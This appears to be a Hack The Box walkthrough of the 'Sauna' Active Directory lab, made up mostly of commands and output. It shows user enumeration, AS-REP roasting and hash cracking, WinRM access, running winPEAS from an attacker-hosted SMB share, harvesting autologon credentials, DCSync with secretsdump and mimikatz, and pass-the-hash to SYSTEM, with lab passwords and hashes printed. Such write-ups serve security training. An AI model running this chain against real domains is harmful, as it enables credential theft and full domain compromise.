# Sauna
## kerbrute
## impacket
## evil-winrm
## bloodhound
## mimikatz
## impacket-GetNPUsers
## impacket-smbserver
## impacket-secretsdump
## impacket-psexec
``````

➜  sudo vi /etc/hosts
Add:

10.10.10.175 sauna.htb

➜  rustscan -a sauna.htb --ulimit 5000    

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
49667/tcp open  unknown          syn-ack
49673/tcp open  unknown          syn-ack
49674/tcp open  unknown          syn-ack
49677/tcp open  unknown          syn-ack
49695/tcp open  unknown          syn-ack
49718/tcp open  unknown          syn-ack

➜  sudo nmap -Pn -sV -T4 -p- -oA ~/htb/Active_Directory_101/Sauna/nmap -vv sauna.htb

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-07-01 06:09:35Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49695/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49718/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

➜  sudo nmap -Pn -A -T4 -p- -vv sauna.htb 

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: Egotistical Bank :: Home
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-07-01 06:15:56Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49695/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49718/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

Host script results:
| smb2-time: 
|   date: 2022-07-01T06:16:55
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 35558/tcp): CLEAN (Timeout)
|   Check 2 (port 49942/tcp): CLEAN (Timeout)
|   Check 3 (port 15118/udp): CLEAN (Timeout)
|   Check 4 (port 57297/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 7h00m00s

➜  ldapsearch -x -H ldap://sauna.htb -b 'dc=egotistical-bank,dc=local'

Response:

# Hugo Smith, EGOTISTICAL-BANK.LOCAL
dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL

➜  sudo apt install golang

➜  cd /opt ; sudo git clone https://github.com/ropnop/kerbrute.git ; make all ; cd dist

➜  dist git:(master) ./kerbrute_linux_amd64 userenum -d egotistical-bank.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc sauna.htb

2022/06/30 18:58:12 >  [+] VALID USERNAME:	 administrator@egotistical-bank.local
2022/06/30 18:59:46 >  [+] VALID USERNAME:	 hsmith@egotistical-bank.local
2022/06/30 18:59:57 >  [+] VALID USERNAME:	 Administrator@egotistical-bank.local
2022/06/30 19:00:43 >  [+] fsmith has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$fsmith@EGOTISTICAL-BANK.LOCAL:08570ea1417da08aab73b44460af409e$02250ed09fd18041623f37ad8d6eb76768c482e1a04554a74e0477f98a65fefc7e9474094d0204bddc7a510889536da6d17779dc101e83a8f3f95d1c8a0a5b1acbf9d4fab3b9d9501cacfd4ae96a4fe901f9074e9d67fc052372cba6343d49dddea9d351781d6511fd3fe585450971c2e3692cb0e7bde33eb633a1d3166a9805c8082714638247c6dceeea5962df29b64a0ee700a9db4506d445eb65d87eeeaa688ae6af9ebb9c52dcd6b75b02947e08c81bb424c4b38cc1ac694ef1e794bf307ec2b86453f40a8212d1a203fd8cab368066dd7be147fa2257393955e39689fcf8d6aafe6b7d42dc909d108a927279d1b0e0cfac4dd5ef59d971fc528a42b9a05f6e8a30160c58771deacb33bde3025fa511c93080ed
2022/06/30 19:00:43 >  [+] VALID USERNAME:	 fsmith@egotistical-bank.local

➜  cd ~/htb/Active_Directory_101/Sauna
➜  vi hash.txt
Add:

$krb5asrep$18$fsmith@EGOTISTICAL-BANK.LOCAL:08570ea1417da08aab73b44460af409e$02250ed09fd18041623f37ad8d6eb76768c482e1a04554a74e0477f98a65fefc7e9474094d0204bddc7a510889536da6d17779dc101e83a8f3f95d1c8a0a5b1acbf9d4fab3b9d9501cacfd4ae96a4fe901f9074e9d67fc052372cba6343d49dddea9d351781d6511fd3fe585450971c2e3692cb0e7bde33eb633a1d3166a9805c8082714638247c6dceeea5962df29b64a0ee700a9db4506d445eb65d87eeeaa688ae6af9ebb9c52dcd6b75b02947e08c81bb424c4b38cc1ac694ef1e794bf307ec2b86453f40a8212d1a203fd8cab368066dd7be147fa2257393955e39689fcf8d6aafe6b7d42dc909d108a927279d1b0e0cfac4dd5ef59d971fc528a42b9a05f6e8a30160c58771deacb33bde3025fa511c93080ed

➜  hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt

Fail

➜  echo "fsmith" > user.txt

➜  impacket-GetNPUsers 'egotistical-bank.local/' -usersfile user.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175   

➜  hashcat -m 18200 hashes.aspreroast /usr/share/wordlists/rockyou.txt --force

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:0877affc7af744044b073ca11eed4867$f759fe0ed2a9e978dcf88db8b2f82a3ab62ef2dc961d7c1b19944e683bb024193a4d7b20d322958b07bf5aa89cb59bb24b2b11a2fb2ee52ce867c95937df05a818f4d5edd09a160ee4b9cab9ac4795e311e7209448af3a1392b987c5480e9fc09e14a8b5951b7981c5f0abe34e77095d0a4c645f4e4bdb125cbc7a07641cb8bd78060b0c51cf733fe325b9c6103b969011e339db5a114466b719db87e82be312a7b0ecfe2064127da64b688e1aed40d5c95d5fe672c809a7177a6d38f4f5815ea87b038485ce217dd14f37d0e530140b508a21f515a91cac4ef6295957ac8466353338d2d18c9208c1bf9f33b98df667265a4dd2c1f73ca43017f6467a452850:Thestrokes23

Password:

Thestrokes23

➜  evil-winrm -i sauna.htb -u fsmith -p Thestrokes23

*Evil-WinRM* PS C:\Users\FSmith\Documents> type C:\Users\FSmith\Desktop\user.txt

user_flag

➜  sudo impacket-smbserver share . -smb2support -username hey -password hey

on target

*Evil-WinRM* PS C:\> net use \\10.10.16.2\share /u:hey hey
*Evil-WinRM* PS C:\> cd  \\10.10.16.2\share
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.16.2\share> .\winPEASx64.exe cmd fast > sauna_winpeas_fast
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.16.2\share> net use /d \\10.10.16.2\share

➜  sudo mv sauna_winpeas_fast ~/htb/Active_Directory_101/Sauna

Winpeas discovered credentials
Alternatively,

*Evil-WinRM* PS C:\> get-item -path 'HKLM:\software\microsoft\windows nt\currentversion\winlogon'

Name                           Property
----                           --------
winlogon                       AutoRestartShell             : 1
                               Background                   : 0 0 0
                               CachedLogonsCount            : 10
                               DebugServerCommand           : no
                               DefaultDomainName            : EGOTISTICALBANK
                               DefaultUserName              : EGOTISTICALBANK\svc_loanmanager
                               DisableBackButton            : 1
                               EnableSIHostIntegration      : 1
                               ForceUnlockLogon             : 0
                               LegalNoticeCaption           :
                               LegalNoticeText              :
                               PasswordExpiryWarning        : 5
                               PowerdownAfterShutdown       : 0
                               PreCreateKnownFolders        : {A520A1A4-1780-4FF6-BD18-167343C5AF16}
                               ReportBootOk                 : 1
                               Shell                        : explorer.exe
                               ShellCritical                : 0
                               ShellInfrastructure          : sihost.exe
                               SiHostCritical               : 0
                               SiHostReadyTimeOut           : 0
                               SiHostRestartCountLimit      : 0
                               SiHostRestartTimeGap         : 0
                               Userinit                     : C:\Windows\system32\userinit.exe,
                               VMApplet                     : SystemPropertiesPerformance.exe /pagefile
                               WinStationsDisabled          : 0
                               scremoveoption               : 0
                               DisableCAD                   : 1
                               LastLogOffEndTimePerfCounter : 5742365237
                               ShutdownFlags                : 19
                               DisableLockWorkstation       : 0
                               DefaultPassword              : Moneymakestheworldgoround!

uname:pword:

svc_loanmanager:Moneymakestheworldgoround!

*Evil-WinRM* PS C:\> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr

uname:pword:

svc_loanmgr:Moneymakestheworldgoround!

➜  evil-winrm -i sauna.htb -u svc_loanmgr -p Moneymakestheworldgoround!
➜  cd /usr/share/metasploit-framework/data/post  
➜  sudo impacket-smbserver share . -smb2support -username hey -password hey

on target

*Evil-WinRM* PS > net use \\10.10.16.2\share /u:hey hey
*Evil-WinRM* PS > cd  \\10.10.16.2\share
*Evil-WinRM* PS > net use /d \\10.10.16.2\share

➜  post sudo mv 20220701011647_BloodHound.zip ZDFkMDEyYjYtMmE1ZS00YmY3LTk0OWItYTM2OWVmMjc5NDVk.bin ~/htb/Active_Directory_101/Sauna

---
If docker required for neo4j server

➜  vi neo4j.sh
Add:
docker run \
    --name neo4j-server \
    -p7474:7474 -p7687:7687 \
    -d \
    -v $HOME/neo4j/data:/data \
    -v $HOME/neo4j/logs:/logs \
    -v $HOME/neo4j/import:/var/lib/neo4j/import \
    -v $HOME/neo4j/plugins:/plugins \
    --env NEO4J_AUTH=neo4j/bl00dh0und \
    neo4j:latest

➜  chmod 700 neo4j.sh
➜  sudo service docker start
➜  ./neo4j.sh 

Authenticate with uname:pword

neo4j:bl00dh0und
---

➜  cd ~/Downloads ; wget https://github.com/BloodHoundAD/BloodHound/releases/download/4.0.3/BloodHound-linux-x64.zip ; unzip BloodHound-linux-x64.zip ; cd BloodHound-linux-x64 ; ./BloodHound --no-sandbox

Upload data -> ~/htb/Active_Directory_101/Sauna/20220701011647_Bloodhound.zip

Type in search:

svc

Click:

SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL

Right-click 'SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL' icon
Select:

'! Mark user as owned'

Left-click 'SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL' icon

Go to: 'Node Info' -> 'OUTBOUND CONTROL RIGHTS' -> Left-click 'First Degree Object Control'

Hover over 'GetChangesAll' -> Right-click -> Help

Note response

Hover over 'GetChanges' -> Right-click -> Help

Note response

➜  ~ impacket-secretsdump 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::

Alternatively,

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> cd C:\programdata
*Evil-WinRM* PS C:\programdata> upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
*Evil-WinRM* PS C:\programdata> .\mimikatz.exe 'lsadump::dcsync /domain:egotistical-bank.local /user:administrator' exit

SAM Username         : Administrator

Credentials:
  Hash NTLM: 823452073d75b9d1cf70ebdf86c7f98e
    ntlm- 0: 823452073d75b9d1cf70ebdf86c7f98e
    ntlm- 1: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 2: 7facdc498ed1680c4fd1448319a8c04f
    lm  - 0: 365ca60e4aba3e9a71d78a3912caf35c
    lm  - 1: 7af65ae5e7103761ae828523c7713031

➜  ~ impacket-psexec -dc-ip sauna.htb administrator@sauna.htb -hashes 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e'

C:\Windows\system32> whoami

nt authority\system

C:\Windows\system32> type C:\Users\FSmith\desktop\user.txt

user_flag

C:\Windows\system32> type C:\Users\administrator\desktop\root.txt

root_flag

``````

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630190712.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630193136.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630193204.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220709155403.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630195533.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630200542.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630200632.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630200818.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630211147.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630211228.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630211032.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630211243.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630211300.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630211512.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630212447.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630212934.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630213408.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220630214040.png)

#hacking
